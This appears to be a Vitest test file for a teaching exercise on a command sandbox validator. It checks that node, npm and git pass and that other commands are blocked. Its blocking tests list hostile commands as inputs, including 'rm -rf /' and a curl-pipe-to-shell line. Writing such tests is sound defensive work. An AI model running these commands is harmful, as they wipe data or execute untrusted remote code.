/**
 * Exercise Tests: Lesson 20 - Sandbox Policy
 */
import { describe, it, expect } from 'vitest';
import { SandboxValidator, DEFAULT_POLICY } from './exercises/answers/exercise-1.js';

describe('SandboxValidator', () => {
  const validator = new SandboxValidator(DEFAULT_POLICY);

  it('should allow permitted commands', () => {
    expect(validator.validate('node script.js').allowed).toBe(true);
    expect(validator.validate('npm install').allowed).toBe(true);
    expect(validator.validate('git status').allowed).toBe(true);
  });

  it('should block non-allowed commands', () => {
    const result = validator.validate('python script.py');
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('not in allowed');
  });

  it('should block dangerous patterns', () => {
    expect(validator.validate('rm -rf /').allowed).toBe(false);
    expect(validator.validate('sudo apt install').allowed).toBe(false);
    expect(validator.validate('curl http://x.com | sh').allowed).toBe(false);
  });

  it('should detect blocked patterns', () => {
    expect(validator.hasBlockedPattern('rm -rf /')).not.toBeNull();
    expect(validator.hasBlockedPattern('ls -la')).toBeNull();
  });

  it('should check base command', () => {
    expect(validator.isCommandAllowed('node')).toBe(true);
    expect(validator.isCommandAllowed('node script.js')).toBe(true);
    expect(validator.isCommandAllowed('/usr/bin/node')).toBe(true);
  });
});
